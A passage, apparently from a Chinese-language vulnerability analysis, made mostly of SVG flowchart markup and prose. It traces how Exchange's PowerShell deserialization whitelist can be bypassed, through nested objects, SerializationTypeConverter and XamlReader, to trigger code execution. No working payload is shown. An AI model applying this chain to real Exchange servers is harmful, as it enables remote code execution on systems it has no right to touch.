&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1319.37" width="103.14" height="82.5114"/>
&lt;rect x="0" y="1278.12" width="103.139" height="82.5114" class="st2"/>
&lt;text x="5.77" y="1311.57" class="st11" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>转化为在&lt;tspan
class="st10">m&lt;/tspan>&lt;tspan class="st10">_&lt;/tspan>&lt;tspan class="st10">assmblyName&lt;/tspan>&lt;tspan x="4.11"
dy="1.3em" class="st5">对应的&lt;/tspan>&lt;tspan class="st10">DLL&lt;/tspan>中的&lt;tspan class="st10">m&lt;/tspan>&lt;tspan
class="st10">_&lt;/tspan>&lt;tspan class="st10">data&lt;/tspan>对应&lt;tspan x="23.1" dy="1.3em" class="st5">类型的&lt;/tspan>&lt;tspan
class="st10">Type&lt;/tspan>对象&lt;/text> &lt;/g>
&lt;g id="shape41-165" v:mID="41" v:groupContext="shape" v:layerMember="1" transform="translate(462.593,-722.835)">
&lt;title>动态连接线.41&lt;/title>
&lt;desc>一系列返回&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="-98.6173" cy="1482.83" width="50.2" height="18.4064"/>
&lt;path d="M0 1360.63 L0 1482.83 L-151.41 1482.83 A3 3 -180 0 0 -157.41 1482.83 L-207.24 1482.83 A3 3 -180 0 0 -213.24
1482.83 L-298.17 1482.83 L-298.17 1467.61" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-118.617" y="1477.63" width="39.9998" height="10.403" class="st8"/>
&lt;text x="-118.62" y="1485.43" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>一系列返回&lt;/text> &lt;/g>
&lt;g id="shape43-172" v:mID="43" v:groupContext="shape" v:layerMember="1" transform="translate(112.85,-652.838)">
&lt;title>动态连接线.43&lt;/title>
&lt;path d="M0 1360.63 L-21.26 1360.63 L-21.26 1477.58 L45.38 1477.58 L45.38 1492.8" class="st6"/>
&lt;/g>
&lt;g id="shape42-177" v:mID="42" v:groupContext="shape" v:layerMember="0" transform="translate(106.662,-452.748)">
&lt;title>流程.42&lt;/title>
&lt;desc>将ConverTo返回的Type对象加入.adaptedMembers&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="2.17" y="1327.09" class="st11" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>将&lt;tspan class="st10">ConverTo&lt;/tspan>返回的&lt;tspan
class="st10">Type&lt;/tspan>对象&lt;tspan x="11.46" dy="1.3em" class="st5">加入&lt;/tspan>&lt;tspan class="st10"
v:langID="1033">.&lt;/tspan>&lt;tspan class="st10" v:langID="1033">adaptedMembers&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape45-185" v:mID="45" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-312.478)">
&lt;title>流程.45&lt;/title>
&lt;desc>GetTargetTypeForDeserialization&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="3.07" y="1327.29" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>GetTargetTypeForDeserializ&lt;tspan
x="42.6" dy="1.2em" class="st5">ation&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape53-189" v:mID="53" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1141.72)">
&lt;title>流程.53&lt;/title>
&lt;desc>ReadOneDeserializedObject&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="2.42" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadOneDeserializedObject&lt;/text> &lt;/g>
&lt;g id="shape54-192" v:mID="54" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1257.23)">
&lt;title>流程.54&lt;/title>
&lt;desc>ReadOneObject&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="23.69" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadOneObject&lt;/text> &lt;/g>
&lt;g id="shape56-195" v:mID="56" v:groupContext="shape" v:layerMember="1" transform="translate(203.746,-483.689)">
&lt;title>动态连接线.56&lt;/title>
&lt;path d="M6.06 1360.63 L48.6 1360.63 L48.6 556.14 L14.16 556.14" class="st6"/>
&lt;/g>
&lt;g id="shape57-200" v:mID="57" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1257.23)">
&lt;title>动态连接线.57&lt;/title>
&lt;path d="M7.09 1360.63 L7.09 1408.22" class="st6"/>
&lt;/g>
&lt;g id="shape58-205" v:mID="58" v:groupContext="shape" v:layerMember="1" transform="translate(153.208,-1141.72)">
&lt;title>动态连接线.58&lt;/title>
&lt;path d="M7.09 1360.63 L7.09 1420.6" class="st6"/>
&lt;/g>
&lt;g id="shape59-210" v:mID="59" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)">
&lt;title>动态连接线.59&lt;/title>
&lt;desc>调用&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="-90.9685" cy="1790.99" width="40" height="18.4064"/>
&lt;path d="M0 1360.63 L0 1381.89 L-90.97 1381.89 L-90.97 2274.44 L-59.13 2274.44" class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="-98.9685" y="1785.79" width="15.9999" height="10.403" class="st8"/>
&lt;text x="-98.97" y="1793.59" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用&lt;/text> &lt;/g>
&lt;g id="shape61-217" v:mID="61" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-312.478)">
&lt;title>动态连接线.61&lt;/title>
&lt;path d="M7.09 1360.63 L7.09 1416.47" class="st6"/>
&lt;/g>
&lt;g id="shape60-222" v:mID="60" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-188.711)">
&lt;title>流程.60&lt;/title>
&lt;desc>GetPSStandardMember&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="10.13" y="1332.09" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>GetPSStandardMember&lt;/text> &lt;/g>
&lt;g id="shape63-225" v:mID="63" v:groupContext="shape" v:layerMember="1" transform="translate(151.688,-188.711)">
&lt;title>动态连接线.63&lt;/title>
&lt;path d="M7.09 1360.63 L7.09 1408.22" class="st6"/>
&lt;/g>
&lt;g id="shape62-230" v:mID="62" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-56.6929)">
&lt;title>流程.62&lt;/title>
&lt;desc>读取adaptedMembers的TargetTypeForDeserialization并返回&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1321.44" width="103.14" height="78.3858"/>
&lt;rect x="0" y="1282.24" width="103.139" height="78.3858" class="st2"/>
&lt;text x="8.33" y="1314.04" class="st11" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>读取&lt;tspan
class="st10" v:langID="1033">adaptedMembers&lt;/tspan>的&lt;tspan x="2.55" dy="1.225em" class="st10"
v:langID="1033">TargetTypeForDeserializatio&lt;/tspan>&lt;tspan x="37.31" dy="1.275em" class="st10"
v:langID="1033">n&lt;/tspan>并返回&lt;/text> &lt;/g>
&lt;g id="shape66-236" v:mID="66" v:groupContext="shape" v:layerMember="1" transform="translate(160.294,-1257.23)">
&lt;title>动态连接线.66&lt;/title>
&lt;desc>调用将外层对象序列化数据&lt;/desc>
&lt;v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="147.889" cy="1737.72" width="114.2" height="18.4064"/>
&lt;path d="M0 1360.63 L0 1381.89 L89.05 1381.89 A3 3 0 0 1 95.05 1381.89 L147.89 1381.89 L147.89 2241.44 L163.11 2241.44"
class="st6"/>
&lt;rect v:rectContext="textBkgnd" x="95.8888" y="1732.52" width="104" height="10.403" class="st8"/>
&lt;text x="95.89" y="1740.32" class="st9" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>调用，将外层对象序列化数据&lt;/text> &lt;/g>
&lt;g id="shape65-243" v:mID="65" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-345.483)">
&lt;title>流程.65&lt;/title>
&lt;desc>LanguagePrimitives.ConvertTo&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="2.54" y="1327.29" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>LanguagePrimitives.Convert&lt;tspan
x="47.13" dy="1.2em" class="st5">To&lt;/tspan>&lt;/text> &lt;/g>
&lt;g id="shape69-247" v:mID="69" v:groupContext="shape" v:layerMember="1" transform="translate(373.926,-345.483)">
&lt;title>动态连接线.69&lt;/title>
&lt;path d="M7.09 1360.63 L7.09 1416.47" class="st6"/>
&lt;/g>
&lt;g id="shape68-252" v:mID="68" v:groupContext="shape" v:layerMember="0" transform="translate(329.443,-221.716)">
&lt;title>流程.68&lt;/title>
&lt;desc>将S标签内数据转换为XamlReader对象触发代码执行&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/>
&lt;rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/>
&lt;text x="13.44" y="1321.89" class="st11" v:langID="2052">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>将&lt;tspan
class="st10">S&lt;/tspan>标签内数据转换为&lt;tspan x="2.4" dy="1.3em" class="st10">XamlReader&lt;/tspan>对象，触发代码&lt;tspan
x="43.57" dy="1.3em" class="st5">执行&lt;/tspan>&lt;/text> &lt;/g>
&lt;/g>
&lt;/svg>
&lt;p>在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在&lt;code>exchange.partial.types.ps1xml&lt;/code>和&lt;code>exchange.types.ps1xml&lt;/code>等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。&lt;/p>
&lt;p>PoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在&lt;code>Exchang&lt;/code>反序列化PoC的里层对象时，将通过&lt;code>ConvertTo&lt;/code>函数转换到目标类，传给&lt;code>ConvertTo&lt;/code>的resultType值为&lt;code>System.Exception&lt;/code>，&lt;code>System.Exception&lt;/code>在&lt;code>exchange.partial.types.ps1xml&lt;/code>中定义如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&amp;lt;Type&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;Name&amp;gt;System.Exception&amp;lt;/Name&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;Members&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;CodeProperty IsHidden=&lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;Name&amp;gt;SerializationData&amp;lt;/Name&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;GetCodeReference&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;TypeName&amp;gt;Microsoft.Exchange.Data.SerializationTypeConverter&amp;lt;/TypeName&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;MethodName&amp;gt;GetSerializationData&amp;lt;/MethodName&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/GetCodeReference&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/CodeProperty&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/Members&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;TypeConverter&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;TypeName&amp;gt;Microsoft.Exchange.Data.SerializationTypeConverter&amp;lt;/TypeName&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/TypeConverter&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/Type&amp;gt;
